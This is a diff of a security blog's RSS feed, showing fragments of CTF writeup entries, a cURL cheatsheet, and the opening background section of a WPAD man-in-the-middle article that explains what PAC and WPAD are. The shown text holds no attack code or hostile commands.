+</blockquote>]]></description><link>https://dev.lwlx.xyz/blog/blog/htb-obfsc4t10n-challenge-writeup</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/htb-obfsc4t10n-challenge-writeup</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackthebox]]></category><category><![CDATA[oBfsC4t10n]]></category><category><![CDATA[htb]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Fri, 22 Jan 2021 11:53:52 GMT</pubDate></item><item><title><![CDATA[Hacker101 CTF Photo Gallery writeup]]></title><description><![CDATA[<h1 id="photogallery_moderate_">Photo Gallery <em>[moderate]</em></h1>
 <p>This is my Write Up for the "Photo Gallery" challenge of HackerOne's CTF.</p>
 <p>As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
 The missing one is called <code>Invisible</code>, so lets look into that.</p>
@@ -205,8 +475,7 @@ SHLVL=0
 <td>DELETE method with <code>cURL</code></td>
 </tr>
 </tbody>
-</table>]]></description><link>https://dev.lwlx.xyz/blog/blog/basic-cURL-cheatsheet-lwlx</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/basic-cURL-cheatsheet-lwlx</guid><category><![CDATA[cheatsheet]]></category><category><![CDATA[commandline]]></category><category><![CDATA[curl]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Thu, 31 Dec 2020 12:07:12 GMT</pubDate></item><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h4 id="thisarticleismarkedasaworkinprogresswip">this article is marked as a work in progress <code>[WIP]</code></h4>
-<h1 id="whatiswpad">What is WPAD?</h1>
+</table>]]></description><link>https://dev.lwlx.xyz/blog/blog/basic-cURL-cheatsheet-lwlx</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/basic-cURL-cheatsheet-lwlx</guid><category><![CDATA[cheatsheet]]></category><category><![CDATA[commandline]]></category><category><![CDATA[curl]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Thu, 31 Dec 2020 12:07:12 GMT</pubDate></item><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h1 id="whatiswpadwip">What is WPAD? <code>[WIP]</code></h1>
 <p>Sometime in the early days of the Internet - the web 1.0 era - a couple of devs at Netscape decided that JavaScript was an acceptable language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It is more expressive and less tedious than XML and seems reasonable to provide configurations to many clients.</p>
 <p>PAC itself works with a protocol called Web Proxy Auto-Discovery (WPAD) WPAD removes the need for the browser or the user to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to discover the server to load the PAC file from.</p>
 <h2 id="wpadalwaysfollowsthisschema">WPAD always follows this schema:</h2>
